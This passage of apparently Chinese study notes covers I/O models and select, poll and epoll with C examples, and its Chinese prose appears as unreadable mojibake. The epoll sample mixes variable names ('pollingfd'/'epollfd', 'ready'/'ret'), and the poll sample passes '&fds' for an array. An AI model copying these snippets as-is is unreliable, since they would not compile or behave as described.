<div><pre><code><span>ssize_t</span> <span>recvfrom</span><span>(</span><span>int</span> sockfd<span>,</span> <span>void</span> <span>*</span>buf<span>,</span> <span>size_t</span> len<span>,</span> <span>int</span> flags<span>,</span> <span>struct</span> <span>sockaddr</span> <span>*</span>src_addr<span>,</span> <span>socklen_t</span> <span>*</span>addrlen<span>)</span><span>;</span>
</code></pre></div><div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492928416812_4.png"/> </div><br>
<h2 id="éé˜»å¡å¼-i-o" tabindex="-1"> éé˜»å¡å¼ I/O</h2>
<p>åº”ç”¨è¿›ç¨‹æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹åï¼Œå†…æ ¸è¿”å›ä¸€ä¸ªé”™è¯¯ç ã€‚åº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦ä¸æ–­çš„æ‰§è¡Œç³»ç»Ÿè°ƒç”¨æ¥è·çŸ¥ I/O æ˜¯å¦å®Œæˆï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºè½®è¯¢ï¼ˆpollingï¼‰ã€‚</p>
<p>ç”±äº CPU è¦å¤„ç†æ›´å¤šçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå› æ­¤è¿™ç§æ¨¡å‹çš„ CPU åˆ©ç”¨ç‡æ¯”è¾ƒä½ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929000361_5.png"/> </div><br>
<h2 id="i-o-å¤ç”¨" tabindex="-1"> I/O å¤ç”¨</h2>
<p>ä½¿ç”¨ select æˆ–è€… poll ç­‰å¾…æ•°æ®ï¼Œå¹¶ä¸”å¯ä»¥ç­‰å¾…å¤šä¸ªå¥—æ¥å­—ä¸­çš„ä»»ä½•ä¸€ä¸ªå˜ä¸ºå¯è¯»ã€‚è¿™ä¸€è¿‡ç¨‹ä¼šè¢«é˜»å¡ï¼Œå½“æŸä¸€ä¸ªå¥—æ¥å­—å¯è¯»æ—¶è¿”å›ï¼Œä¹‹åå†ä½¿ç”¨ recvfrom æŠŠæ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°è¿›ç¨‹ä¸­ã€‚</p>
<p>å®ƒå¯ä»¥è®©å•ä¸ªè¿›ç¨‹å…·æœ‰å¤„ç†å¤šä¸ª I/O äº‹ä»¶çš„èƒ½åŠ›ã€‚åˆè¢«ç§°ä¸º Event Driven I/Oï¼Œå³äº‹ä»¶é©±åŠ¨ I/Oã€‚</p>
<p>å¦‚æœä¸€ä¸ª Web æœåŠ¡å™¨æ²¡æœ‰ I/O å¤ç”¨ï¼Œé‚£ä¹ˆæ¯ä¸€ä¸ª Socket è¿æ¥éƒ½éœ€è¦åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å»å¤„ç†ã€‚å¦‚æœåŒæ—¶æœ‰å‡ ä¸‡ä¸ªè¿æ¥ï¼Œé‚£ä¹ˆå°±éœ€è¦åˆ›å»ºç›¸åŒæ•°é‡çš„çº¿ç¨‹ã€‚ç›¸æ¯”äºå¤šè¿›ç¨‹å’Œå¤šçº¿ç¨‹æŠ€æœ¯ï¼ŒI/O å¤ç”¨ä¸éœ€è¦è¿›ç¨‹çº¿ç¨‹åˆ›å»ºå’Œåˆ‡æ¢çš„å¼€é”€ï¼Œç³»ç»Ÿå¼€é”€æ›´å°ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929444818_6.png"/> </div><br>
<h2 id="ä¿¡å·é©±åŠ¨-i-o" tabindex="-1"> ä¿¡å·é©±åŠ¨ I/O</h2>
<p>åº”ç”¨è¿›ç¨‹ä½¿ç”¨ sigaction ç³»ç»Ÿè°ƒç”¨ï¼Œå†…æ ¸ç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰å¾…æ•°æ®é˜¶æ®µåº”ç”¨è¿›ç¨‹æ˜¯éé˜»å¡çš„ã€‚å†…æ ¸åœ¨æ•°æ®åˆ°è¾¾æ—¶å‘åº”ç”¨è¿›ç¨‹å‘é€ SIGIO ä¿¡å·ï¼Œåº”ç”¨è¿›ç¨‹æ”¶åˆ°ä¹‹ååœ¨ä¿¡å·å¤„ç†ç¨‹åºä¸­è°ƒç”¨ recvfrom å°†æ•°æ®ä»å†…æ ¸å¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ä¸­ã€‚</p>
<p>ç›¸æ¯”äºéé˜»å¡å¼ I/O çš„è½®è¯¢æ–¹å¼ï¼Œä¿¡å·é©±åŠ¨ I/O çš„ CPU åˆ©ç”¨ç‡æ›´é«˜ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492929553651_7.png"/> </div><br>
<h2 id="å¼‚æ­¥-i-o" tabindex="-1"> å¼‚æ­¥ I/O</h2>
<p>åº”ç”¨è¿›ç¨‹æ‰§è¡Œ aio_read ç³»ç»Ÿè°ƒç”¨ä¼šç«‹å³è¿”å›ï¼Œåº”ç”¨è¿›ç¨‹å¯ä»¥ç»§ç»­æ‰§è¡Œï¼Œä¸ä¼šè¢«é˜»å¡ï¼Œå†…æ ¸ä¼šåœ¨æ‰€æœ‰æ“ä½œå®Œæˆä¹‹åå‘åº”ç”¨è¿›ç¨‹å‘é€ä¿¡å·ã€‚</p>
<p>å¼‚æ­¥ I/O ä¸ä¿¡å·é©±åŠ¨ I/O çš„åŒºåˆ«åœ¨äºï¼Œå¼‚æ­¥ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹ I/O å®Œæˆï¼Œè€Œä¿¡å·é©±åŠ¨ I/O çš„ä¿¡å·æ˜¯é€šçŸ¥åº”ç”¨è¿›ç¨‹å¯ä»¥å¼€å§‹ I/Oã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492930243286_8.png"/> </div><br>
<h2 id="äº”å¤§-i-o-æ¨¡å‹æ¯”è¾ƒ" tabindex="-1"> äº”å¤§ I/O æ¨¡å‹æ¯”è¾ƒ</h2>
<ul>
<li>åŒæ­¥ I/Oï¼šå°†æ•°æ®ä»å†…æ ¸ç¼“å†²åŒºå¤åˆ¶åˆ°åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºçš„é˜¶æ®µï¼ˆç¬¬äºŒé˜¶æ®µï¼‰ï¼Œåº”ç”¨è¿›ç¨‹ä¼šé˜»å¡ã€‚</li>
<li>å¼‚æ­¥ I/Oï¼šç¬¬äºŒé˜¶æ®µåº”ç”¨è¿›ç¨‹ä¸ä¼šé˜»å¡ã€‚</li>
</ul>
<p>åŒæ­¥ I/O åŒ…æ‹¬é˜»å¡å¼ I/Oã€éé˜»å¡å¼ I/Oã€I/O å¤ç”¨å’Œä¿¡å·é©±åŠ¨ I/O ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µã€‚</p>
<p>éé˜»å¡å¼ I/O ã€ä¿¡å·é©±åŠ¨ I/O å’Œå¼‚æ­¥ I/O åœ¨ç¬¬ä¸€é˜¶æ®µä¸ä¼šé˜»å¡ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1492928105791_3.png"/> </div><br>
<h1 id="äºŒã€i-o-å¤ç”¨" tabindex="-1"> äºŒã€I/O å¤ç”¨</h1>
<p>select/poll/epoll éƒ½æ˜¯ I/O å¤šè·¯å¤ç”¨çš„å…·ä½“å®ç°ï¼Œselect å‡ºç°çš„æœ€æ—©ï¼Œä¹‹åæ˜¯ pollï¼Œå†æ˜¯ epollã€‚</p>
<h2 id="æ–‡ä»¶æè¿°ç¬¦" tabindex="-1"> æ–‡ä»¶æè¿°ç¬¦</h2>
<p>æ–‡ä»¶æè¿°ç¬¦ï¼ˆFile descriptorï¼‰æ˜¯è®¡ç®—æœºç§‘å­¦ä¸­çš„ä¸€ä¸ªæœ¯è¯­ï¼Œæ˜¯ä¸€ä¸ªç”¨äºè¡¨è¿°æŒ‡å‘æ–‡ä»¶çš„å¼•ç”¨çš„æŠ½è±¡åŒ–æ¦‚å¿µã€‚</p>
<p>æ–‡ä»¶æè¿°ç¬¦åœ¨å½¢å¼ä¸Šæ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ã€‚å®é™…ä¸Šï¼Œå®ƒæ˜¯ä¸€ä¸ªç´¢å¼•å€¼ï¼ŒæŒ‡å‘å†…æ ¸ä¸ºæ¯ä¸€ä¸ªè¿›ç¨‹æ‰€ç»´æŠ¤çš„è¯¥è¿›ç¨‹æ‰“å¼€æ–‡ä»¶çš„è®°å½•è¡¨ã€‚å½“ç¨‹åºæ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶æˆ–è€…åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶æ—¶ï¼Œå†…æ ¸å‘è¿›ç¨‹è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ç¨‹åºè®¾è®¡ä¸­ï¼Œä¸€äº›æ¶‰åŠåº•å±‚çš„ç¨‹åºç¼–å†™å¾€å¾€ä¼šå›´ç»•ç€æ–‡ä»¶æè¿°ç¬¦å±•å¼€ã€‚ä½†æ˜¯æ–‡ä»¶æè¿°ç¬¦è¿™ä¸€æ¦‚å¿µå¾€å¾€åªé€‚ç”¨äºUNIXã€Linuxè¿™æ ·çš„æ“ä½œç³»ç»Ÿã€‚</p>
<h2 id="select" tabindex="-1"> select</h2>
<div><pre><code><span>int</span> <span>select</span><span>(</span><span>int</span> n<span>,</span> fd_set <span>*</span>readfds<span>,</span> fd_set <span>*</span>writefds<span>,</span> fd_set <span>*</span>exceptfds<span>,</span> <span>struct</span> <span>timeval</span> <span>*</span>timeout<span>)</span><span>;</span>
</code></pre></div><p>select å…è®¸åº”ç”¨ç¨‹åºç›‘è§†ä¸€ç»„æ–‡ä»¶æè¿°ç¬¦ï¼Œç­‰å¾…ä¸€ä¸ªæˆ–è€…å¤šä¸ªæè¿°ç¬¦æˆä¸ºå°±ç»ªçŠ¶æ€ï¼Œä»è€Œå®Œæˆ I/O æ“ä½œã€‚</p>
<ul>
<li>
<p>fd_set ä½¿ç”¨æ•°ç»„å®ç°ï¼Œæ•°ç»„å¤§å°ä½¿ç”¨ FD_SETSIZE å®šä¹‰ï¼Œæ‰€ä»¥åªèƒ½ç›‘å¬å°‘äº FD_SETSIZE æ•°é‡çš„æè¿°ç¬¦ã€‚æœ‰ä¸‰ç§ç±»å‹çš„æè¿°ç¬¦ç±»å‹ï¼šreadsetã€writesetã€exceptsetï¼Œåˆ†åˆ«å¯¹åº”è¯»ã€å†™ã€å¼‚å¸¸æ¡ä»¶çš„æè¿°ç¬¦é›†åˆã€‚</p>
</li>
<li>
<p>timeout ä¸ºè¶…æ—¶å‚æ•°ï¼Œè°ƒç”¨ select ä¼šä¸€ç›´é˜»å¡ç›´åˆ°æœ‰æè¿°ç¬¦çš„äº‹ä»¶åˆ°è¾¾æˆ–è€…ç­‰å¾…çš„æ—¶é—´è¶…è¿‡ timeoutã€‚</p>
</li>
<li>
<p>æˆåŠŸè°ƒç”¨è¿”å›ç»“æœå¤§äº 0ï¼Œå‡ºé”™è¿”å›ç»“æœä¸º -1ï¼Œè¶…æ—¶è¿”å›ç»“æœä¸º 0ã€‚</p>
</li>
</ul>
<div><pre><code>fd_set fd_in<span>,</span> fd_out<span>;</span>
<span>struct</span> <span>timeval</span> tv<span>;</span>

<span>// Reset the sets</span>
<span>FD_ZERO</span><span>(</span> <span>&amp;</span>fd_in <span>)</span><span>;</span>
<span>FD_ZERO</span><span>(</span> <span>&amp;</span>fd_out <span>)</span><span>;</span>

<span>// Monitor sock1 for input events</span>
<span>FD_SET</span><span>(</span> sock1<span>,</span> <span>&amp;</span>fd_in <span>)</span><span>;</span>

<span>// Monitor sock2 for output events</span>
<span>FD_SET</span><span>(</span> sock2<span>,</span> <span>&amp;</span>fd_out <span>)</span><span>;</span>

<span>// Find out which socket has the largest numeric value as select requires it</span>
<span>int</span> largest_sock <span>=</span> sock1 <span>></span> sock2 <span>?</span> sock1 <span>:</span> sock2<span>;</span>

<span>// Wait up to 10 seconds</span>
tv<span>.</span>tv_sec <span>=</span> <span>10</span><span>;</span>
tv<span>.</span>tv_usec <span>=</span> <span>0</span><span>;</span>

<span>// Call the select</span>
<span>int</span> ret <span>=</span> <span>select</span><span>(</span> largest_sock <span>+</span> <span>1</span><span>,</span> <span>&amp;</span>fd_in<span>,</span> <span>&amp;</span>fd_out<span>,</span> <span>NULL</span><span>,</span> <span>&amp;</span>tv <span>)</span><span>;</span>

<span>// Check if select actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>if</span> <span>(</span> <span>FD_ISSET</span><span>(</span> sock1<span>,</span> <span>&amp;</span>fd_in <span>)</span> <span>)</span>
        <span>// input event on sock1</span>

    <span>if</span> <span>(</span> <span>FD_ISSET</span><span>(</span> sock2<span>,</span> <span>&amp;</span>fd_out <span>)</span> <span>)</span>
        <span>// output event on sock2</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br></div></div><h2 id="poll" tabindex="-1"> poll</h2>
<div><pre><code><span>int</span> <span>poll</span><span>(</span><span>struct</span> <span>pollfd</span> <span>*</span>fds<span>,</span> <span>unsigned</span> <span>int</span> nfds<span>,</span> <span>int</span> timeout<span>)</span><span>;</span>
</code></pre></div><p>poll çš„åŠŸèƒ½ä¸ select ç±»ä¼¼ï¼Œä¹Ÿæ˜¯ç­‰å¾…ä¸€ç»„æè¿°ç¬¦ä¸­çš„ä¸€ä¸ªæˆä¸ºå°±ç»ªçŠ¶æ€ã€‚</p>
<p>poll ä¸­çš„æè¿°ç¬¦æ˜¯ pollfd ç±»å‹çš„æ•°ç»„ï¼Œpollfd çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<div><pre><code><span>struct</span> <span>pollfd</span> <span>{</span>
               <span>int</span>   fd<span>;</span>         <span>/* file descriptor */</span>
               <span>short</span> events<span>;</span>     <span>/* requested events */</span>
               <span>short</span> revents<span>;</span>    <span>/* returned events */</span>
           <span>}</span><span>;</span>
</code></pre></div><div><pre><code><span>// The structure for two events</span>
<span>struct</span> <span>pollfd</span> fds<span>[</span><span>2</span><span>]</span><span>;</span>

<span>// Monitor sock1 for input</span>
fds<span>[</span><span>0</span><span>]</span><span>.</span>fd <span>=</span> sock1<span>;</span>
fds<span>[</span><span>0</span><span>]</span><span>.</span>events <span>=</span> POLLIN<span>;</span>

<span>// Monitor sock2 for output</span>
fds<span>[</span><span>1</span><span>]</span><span>.</span>fd <span>=</span> sock2<span>;</span>
fds<span>[</span><span>1</span><span>]</span><span>.</span>events <span>=</span> POLLOUT<span>;</span>

<span>// Wait 10 seconds</span>
<span>int</span> ret <span>=</span> <span>poll</span><span>(</span> <span>&amp;</span>fds<span>,</span> <span>2</span><span>,</span> <span>10000</span> <span>)</span><span>;</span>
<span>// Check if poll actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>// If we detect the event, zero it out so we can reuse the structure</span>
    <span>if</span> <span>(</span> fds<span>[</span><span>0</span><span>]</span><span>.</span>revents <span>&amp;</span> POLLIN <span>)</span>
        fds<span>[</span><span>0</span><span>]</span><span>.</span>revents <span>=</span> <span>0</span><span>;</span>
        <span>// input event on sock1</span>

    <span>if</span> <span>(</span> fds<span>[</span><span>1</span><span>]</span><span>.</span>revents <span>&amp;</span> POLLOUT <span>)</span>
        fds<span>[</span><span>1</span><span>]</span><span>.</span>revents <span>=</span> <span>0</span><span>;</span>
        <span>// output event on sock2</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><h2 id="æ¯”è¾ƒ" tabindex="-1"> æ¯”è¾ƒ</h2>
<h3 id="_1-åŠŸèƒ½" tabindex="-1"> 1. åŠŸèƒ½</h3>
<p>select å’Œ poll çš„åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼Œä¸è¿‡åœ¨ä¸€äº›å®ç°ç»†èŠ‚ä¸Šæœ‰æ‰€ä¸åŒã€‚</p>
<ul>
<li>select ä¼šä¿®æ”¹æè¿°ç¬¦ï¼Œè€Œ poll ä¸ä¼šï¼›</li>
<li>select çš„æè¿°ç¬¦ç±»å‹ä½¿ç”¨æ•°ç»„å®ç°ï¼ŒFD_SETSIZE å¤§å°é»˜è®¤ä¸º 1024ï¼Œå› æ­¤é»˜è®¤åªèƒ½ç›‘å¬ 1024 ä¸ªæè¿°ç¬¦ã€‚å¦‚æœè¦ç›‘å¬æ›´å¤šæè¿°ç¬¦çš„è¯ï¼Œéœ€è¦ä¿®æ”¹ FD_SETSIZE ä¹‹åé‡æ–°ç¼–è¯‘ï¼›è€Œ poll æ²¡æœ‰æè¿°ç¬¦æ•°é‡çš„é™åˆ¶ï¼›</li>
<li>poll æä¾›äº†æ›´å¤šçš„äº‹ä»¶ç±»å‹ï¼Œå¹¶ä¸”å¯¹æè¿°ç¬¦çš„é‡å¤åˆ©ç”¨ä¸Šæ¯” select é«˜ã€‚</li>
<li>å¦‚æœä¸€ä¸ªçº¿ç¨‹å¯¹æŸä¸ªæè¿°ç¬¦è°ƒç”¨äº† select æˆ–è€… pollï¼Œå¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†è¯¥æè¿°ç¬¦ï¼Œä¼šå¯¼è‡´è°ƒç”¨ç»“æœä¸ç¡®å®šã€‚</li>
</ul>
<h3 id="_2-é€Ÿåº¦" tabindex="-1"> 2. é€Ÿåº¦</h3>
<p>select å’Œ poll é€Ÿåº¦éƒ½æ¯”è¾ƒæ…¢ï¼Œæ¯æ¬¡è°ƒç”¨éƒ½éœ€è¦å°†å…¨éƒ¨æè¿°ç¬¦ä»åº”ç”¨è¿›ç¨‹ç¼“å†²åŒºå¤åˆ¶åˆ°å†…æ ¸ç¼“å†²åŒºã€‚</p>
<p>select å’Œ poll çš„è¿”å›ç»“æœä¸­æ²¡æœ‰å£°æ˜å“ªäº›æè¿°ç¬¦å·²ç»å‡†å¤‡å¥½ï¼Œæ‰€ä»¥å¦‚æœè¿”å›å€¼å¤§äº 0 æ—¶ï¼Œåº”ç”¨è¿›ç¨‹éƒ½éœ€è¦ä½¿ç”¨è½®è¯¢çš„æ–¹å¼æ¥æ‰¾åˆ° I/O å®Œæˆçš„æè¿°ç¬¦</p>
<h3 id="_3-å¯ç§»æ¤æ€§" tabindex="-1"> 3. å¯ç§»æ¤æ€§</h3>
<p>å‡ ä¹æ‰€æœ‰çš„ç³»ç»Ÿéƒ½æ”¯æŒ selectï¼Œä½†æ˜¯åªæœ‰æ¯”è¾ƒæ–°çš„ç³»ç»Ÿæ”¯æŒ pollã€‚</p>
<h2 id="epoll" tabindex="-1"> epoll</h2>
<div><pre><code><span>int</span> <span>epoll_create</span><span>(</span><span>int</span> size<span>)</span><span>;</span>
<span>int</span> <span>epoll_ctl</span><span>(</span><span>int</span> epfd<span>,</span> <span>int</span> op<span>,</span> <span>int</span> fd<span>,</span> <span>struct</span> <span>epoll_event</span> <span>*</span>event<span>)</span>ï¼›
<span>int</span> <span>epoll_wait</span><span>(</span><span>int</span> epfd<span>,</span> <span>struct</span> <span>epoll_event</span> <span>*</span> events<span>,</span> <span>int</span> maxevents<span>,</span> <span>int</span> timeout<span>)</span><span>;</span>
</code></pre></div><p><a href="https://www.cnblogs.com/Joy-Hu/p/10762239.html" target="_blank" rel="noopener noreferrer">epollæœ¬è´¨</a></p>
<p>epoll_ctl() ç”¨äºå‘å†…æ ¸æ³¨å†Œæ–°çš„æè¿°ç¬¦æˆ–è€…æ˜¯æ”¹å˜æŸä¸ªæ–‡ä»¶æè¿°ç¬¦çš„çŠ¶æ€ã€‚å·²æ³¨å†Œçš„æè¿°ç¬¦åœ¨å†…æ ¸ä¸­ä¼šè¢«ç»´æŠ¤åœ¨ä¸€æ£µçº¢é»‘æ ‘ä¸Šï¼Œé€šè¿‡å›è°ƒå‡½æ•°å†…æ ¸ä¼šå°† I/O å‡†å¤‡å¥½çš„æè¿°ç¬¦åŠ å…¥åˆ°ä¸€ä¸ªé“¾è¡¨ä¸­ç®¡ç†ï¼Œè¿›ç¨‹è°ƒç”¨ epoll_wait() ä¾¿å¯ä»¥å¾—åˆ°äº‹ä»¶å®Œæˆçš„æè¿°ç¬¦ã€‚</p>
<p>ä»ä¸Šé¢çš„æè¿°å¯ä»¥çœ‹å‡ºï¼Œepoll åªéœ€è¦å°†æè¿°ç¬¦ä»è¿›ç¨‹ç¼“å†²åŒºå‘å†…æ ¸ç¼“å†²åŒºæ‹·è´ä¸€æ¬¡ï¼Œå¹¶ä¸”è¿›ç¨‹ä¸éœ€è¦é€šè¿‡è½®è¯¢æ¥è·å¾—äº‹ä»¶å®Œæˆçš„æè¿°ç¬¦ã€‚</p>
<p>epoll ä»…é€‚ç”¨äº Linux OSã€‚</p>
<p>epoll æ¯” select å’Œ poll æ›´åŠ çµæ´»è€Œä¸”æ²¡æœ‰æè¿°ç¬¦æ•°é‡é™åˆ¶ã€‚</p>
<p>epoll å¯¹å¤šçº¿ç¨‹ç¼–ç¨‹æ›´æœ‰å‹å¥½ï¼Œä¸€ä¸ªçº¿ç¨‹è°ƒç”¨äº† epoll_wait() å¦ä¸€ä¸ªçº¿ç¨‹å…³é—­äº†åŒä¸€ä¸ªæè¿°ç¬¦ä¹Ÿä¸ä¼šäº§ç”Ÿåƒ select å’Œ poll çš„ä¸ç¡®å®šæƒ…å†µã€‚</p>
<div><pre><code><span>// Create the epoll descriptor. Only one is needed per app, and is used to monitor all sockets.</span>
<span>// The function argument is ignored (it was not before, but now it is), so put your favorite number here</span>
<span>int</span> pollingfd <span>=</span> <span>epoll_create</span><span>(</span> <span>0xCAFE</span> <span>)</span><span>;</span>

<span>if</span> <span>(</span> pollingfd <span>&lt;</span> <span>0</span> <span>)</span>
 <span>// report error</span>

<span>// Initialize the epoll structure in case more members are added in future</span>
<span>struct</span> <span>epoll_event</span> ev <span>=</span> <span>{</span> <span>0</span> <span>}</span><span>;</span>

<span>// Associate the connection class instance with the event. You can associate anything</span>
<span>// you want, epoll does not use this information. We store a connection class pointer, pConnection1</span>
ev<span>.</span>data<span>.</span>ptr <span>=</span> pConnection1<span>;</span>

<span>// Monitor for input, and do not automatically rearm the descriptor after the event</span>
ev<span>.</span>events <span>=</span> EPOLLIN <span>|</span> EPOLLONESHOT<span>;</span>
<span>// Add the descriptor into the monitoring list. We can do it even if another thread is</span>
<span>// waiting in epoll_wait - the descriptor will be properly added</span>
<span>if</span> <span>(</span> <span>epoll_ctl</span><span>(</span> epollfd<span>,</span> EPOLL_CTL_ADD<span>,</span> pConnection1<span>-></span><span>getSocket</span><span>(</span><span>)</span><span>,</span> <span>&amp;</span>ev <span>)</span> <span>!=</span> <span>0</span> <span>)</span>
    <span>// report error</span>

<span>// Wait for up to 20 events (assuming we have added maybe 200 sockets before that it may happen)</span>
<span>struct</span> <span>epoll_event</span> pevents<span>[</span> <span>20</span> <span>]</span><span>;</span>

<span>// Wait for 10 seconds, and retrieve less than 20 epoll_event and store them into epoll_event array</span>
<span>int</span> ready <span>=</span> <span>epoll_wait</span><span>(</span> pollingfd<span>,</span> pevents<span>,</span> <span>20</span><span>,</span> <span>10000</span> <span>)</span><span>;</span>
<span>// Check if epoll actually succeed</span>
<span>if</span> <span>(</span> ret <span>==</span> <span>-</span><span>1</span> <span>)</span>
    <span>// report error and abort</span>
<span>else</span> <span>if</span> <span>(</span> ret <span>==</span> <span>0</span> <span>)</span>
    <span>// timeout; no event detected</span>
<span>else</span>
<span>{</span>
    <span>// Check if any events detected</span>
    <span>for</span> <span>(</span> <span>int</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> ret<span>;</span> i<span>++</span> <span>)</span>
    <span>{</span>
        <span>if</span> <span>(</span> pevents<span>[</span>i<span>]</span><span>.</span>events <span>&amp;</span> EPOLLIN <span>)</span>
        <span>{</span>
            <span>// Get back our connection pointer</span>
            Connection <span>*</span> c <span>=</span> <span>(</span>Connection<span>*</span><span>)</span> pevents<span>[</span>i<span>]</span><span>.</span>data<span>.</span>ptr<span>;</span>
            c<span>-></span><span>handleReadEvent</span><span>(</span><span>)</span><span>;</span>
         <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br></div></div><h2 id="å·¥ä½œæ¨¡å¼" tabindex="-1"> å·¥ä½œæ¨¡å¼</h2>
<p>epoll çš„æè¿°ç¬¦äº‹ä»¶æœ‰ä¸¤ç§è§¦å‘æ¨¡å¼ï¼šLTï¼ˆlevel triggerï¼‰å’Œ ETï¼ˆedge triggerï¼‰ã€‚</p>
<h3 id="_1-lt-æ¨¡å¼" tabindex="-1"> 1. LT æ¨¡å¼</h3>
<p>å½“ epoll_wait() æ£€æµ‹åˆ°æè¿°ç¬¦äº‹ä»¶åˆ°è¾¾æ—¶ï¼Œå°†æ­¤äº‹ä»¶é€šçŸ¥è¿›ç¨‹ï¼Œè¿›ç¨‹å¯ä»¥ä¸ç«‹å³å¤„ç†è¯¥äº‹ä»¶ï¼Œä¸‹æ¬¡è°ƒç”¨ epoll_wait() ä¼šå†æ¬¡é€šçŸ¥è¿›ç¨‹ã€‚æ˜¯é»˜è®¤çš„ä¸€ç§æ¨¡å¼ï¼Œå¹¶ä¸”åŒæ—¶æ”¯æŒ Blocking å’Œ No-Blockingã€‚</p>
<h3 id="_2-et-æ¨¡å¼" tabindex="-1"> 2. ET æ¨¡å¼</h3>
<p>å’Œ LT æ¨¡å¼ä¸åŒçš„æ˜¯ï¼Œé€šçŸ¥ä¹‹åè¿›ç¨‹å¿…é¡»ç«‹å³å¤„ç†äº‹ä»¶ï¼Œä¸‹æ¬¡å†è°ƒç”¨ epoll_wait() æ—¶ä¸ä¼šå†å¾—åˆ°äº‹ä»¶åˆ°è¾¾çš„é€šçŸ¥ã€‚</p>
<p>å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘äº† epoll äº‹ä»¶è¢«é‡å¤è§¦å‘çš„æ¬¡æ•°ï¼Œå› æ­¤æ•ˆç‡è¦æ¯” LT æ¨¡å¼é«˜ã€‚åªæ”¯æŒ No-Blockingï¼Œä»¥é¿å…ç”±äºä¸€ä¸ªæ–‡ä»¶å¥æŸ„çš„é˜»å¡è¯»/é˜»å¡å†™æ“ä½œæŠŠå¤„ç†å¤šä¸ªæ–‡ä»¶æè¿°ç¬¦çš„ä»»åŠ¡é¥¿æ­»ã€‚</p>
<h2 id="åº”ç”¨åœºæ™¯" tabindex="-1"> åº”ç”¨åœºæ™¯</h2>
<p>å¾ˆå®¹æ˜“äº§ç”Ÿä¸€ç§é”™è§‰è®¤ä¸ºåªè¦ç”¨ epoll å°±å¯ä»¥äº†ï¼Œselect å’Œ poll éƒ½å·²ç»è¿‡æ—¶äº†ï¼Œå…¶å®å®ƒä»¬éƒ½æœ‰å„è‡ªçš„ä½¿ç”¨åœºæ™¯ã€‚</p>
<h3 id="_1-select-åº”ç”¨åœºæ™¯" tabindex="-1"> 1. select åº”ç”¨åœºæ™¯</h3>
